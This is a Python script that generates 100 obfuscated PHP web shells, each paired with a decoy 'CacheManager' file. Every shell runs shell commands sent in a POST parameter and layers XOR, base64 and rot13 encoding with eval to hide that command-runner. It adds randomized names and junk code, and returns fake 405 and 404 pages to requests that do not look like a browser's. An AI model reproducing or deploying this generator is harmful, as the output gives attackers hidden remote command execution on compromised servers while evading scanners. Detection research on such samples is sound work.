import os
import random
import base64
import string
import hashlib
import codecs
from pathlib import Path

OUTPUT_DIR = Path("/data/php_webshellv14")
KEY = hashlib.sha256(os.urandom(32)).hexdigest()[:16]

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_random_namespace():
    parts = [generate_random_var() for _ in range(3)]
    return "\\".join(parts)

def generate_random_class_name():
    return ''.join(random.choices(string.ascii_uppercase, k=1)) + generate_random_var(7)

def generate_random_method_name():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))

def xor_encode(data, key):
    result = ''
    for i in range(len(data)):
        result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return result

def xor_encode_base64(data, key):
    xor_bytes = xor_encode(data, key).encode()
    return base64.b64encode(xor_bytes).decode()

def rot13_encode(data):
    return codecs.encode(data, 'rot13')

def generate_junk_code():
    lines = []
    for _ in range(random.randint(5, 10)):
        var = generate_random_var()
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        lines.append(f"${var} = '{val}';")
    return '\n'.join(lines)

def generate_trait_code():
    trait_name = generate_random_class_name()
    method_name = generate_random_method_name()
    return f"""
    trait {trait_name} {{
        private function {method_name}($data) {{
            $closure = function($d) {{
                eval($d);
            }};
            $closure($data);
        }}
        
        private function execCommand($cmd) {{
            $output = array();
            $return_var = 0;
            exec($cmd . " 2>&1", $output, $return_var);
            return implode("\\n", $output);
        }}
    }}
    """, trait_name, method_name

def generate_closure_code():
    var_name = generate_random_var()
    return f"""
    ${var_name} = Closure::bind(
        function($data) {{
            return $this->processData($data);
        }},
        $this,
        get_class()
    );
    """, var_name

def generate_generator_code():
    func_name = generate_random_method_name()
    return f"""
    private function {func_name}($data) {{
        foreach (str_split($data, 3) as $chunk) {{
            yield $this->processChunk($chunk);
        }}
    }}
    """, func_name

def build_webshell(index):
    namespace = generate_random_namespace()
    main_class_name = generate_random_class_name()
    method_name = generate_random_method_name()
    
    # 创建伪装文件 - 看起来像缓存管理器
    normal_file_name = f"cache_{index}.php"
    with open(os.path.join(OUTPUT_DIR, normal_file_name), 'w') as f:
        f.write("""<?php
class CacheManager {
    private static $instance;
    private $data = array();
    
    private function __construct() {}
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    public function set($key, $value) {
        $this->data[$key] = $value;
        return true;
    }
    
    public function get($key) {
        return isset($this->data[$key]) ? $this->data[$key] : null;
    }
}
?>""")
    
    # 实际payload
    payload_code = """
        if (!isset($_POST['qaxniubi'])) {
            return;
        }
        
        $cmd = trim($_POST['qaxniubi']);
        if (empty($cmd)) {
            return;
        }
        
        $output = array();
        $return_var = 0;
        exec($cmd . " 2>&1", $output, $return_var);
        echo implode("\\n", $output);
    """
    
    encoded_payload = payload_code
    for _ in range(3):
        encoded_payload = xor_encode_base64(encoded_payload, KEY)
        encoded_payload = rot13_encode(encoded_payload)
    
    shell = f"""<?php
declare(strict_types=1);
namespace {namespace};

use ArrayObject;
use ArrayIterator;
use Closure;
use Generator;

error_reporting(0);
ini_set('display_errors', '0');

// 基本请求检查
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {{
    header('HTTP/1.1 405 Method Not Allowed');
    header('Allow: POST');
    echo '<html><head><title>405 Method Not Allowed</title></head><body><h1>Method Not Allowed</h1></body></html>';
    exit;
}}

// User-Agent检查
if (!isset($_SERVER['HTTP_USER_AGENT']) || 
    (strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') === false && 
     strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') === false && 
     strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') === false)) {{
    header('HTTP/1.1 404 Not Found');
    echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}}

header('Content-Type: text/html; charset=UTF-8');

@include_once '{normal_file_name}';

class {main_class_name} {{
    private $data;
    private static $instance;
    private $startTime;
    
    private function __construct($data) {{
        $this->data = $data;
        $this->startTime = time();
    }}
    
    public function __destruct() {{
        $this->data = null;
        $this->startTime = null;
    }}
    
    public function __wakeup() {{
        $this->startTime = time();
    }}
    
    public static function getInstance($data) {{
        if (self::$instance === null) {{
            self::$instance = new static($data);
        }}
        return self::$instance;
    }}
    
    private function checkExecutionTime() {{
        return (time() - $this->startTime) <= 30;
    }}
    
    public function {method_name}() {{
        if ($this->checkExecutionTime()) {{
            eval($this->data);
        }}
    }}
}}

{generate_junk_code()}

$k = '{KEY}';
$p = '{encoded_payload}';
$d = $p;

function xorString($str, $key) {{
    $result = '';
    $keyLen = strlen($key);
    for($i = 0; $i < strlen($str); $i++) {{
        $result .= chr(ord($str[$i]) ^ ord($key[$i % $keyLen]));
    }}
    return $result;
}}

for($round = 0; $round < 3; $round++) {{
    $d = str_rot13($d);
    $decoded = base64_decode($d);
    if ($decoded === false) {{ return; }}
    $d = xorString($decoded, $k);
}}

$magic = \\{namespace}\\{main_class_name}::getInstance($d);
if (!$magic) {{
    return;
}}

$magic->{method_name}();

?>"""
    return shell

def generate_webshell_samples(n):
    for i in range(n):
        shell_code = build_webshell(i)
        path = os.path.join(OUTPUT_DIR, f"adv_webshell_{i}.php")
        with open(path, 'w') as f:
            f.write(shell_code)
    print(f"Generated {n} advanced PHP WebShells in {OUTPUT_DIR}")

def main():
    num_samples = 100
    generate_webshell_samples(num_samples)

if __name__ == "__main__":
    main() 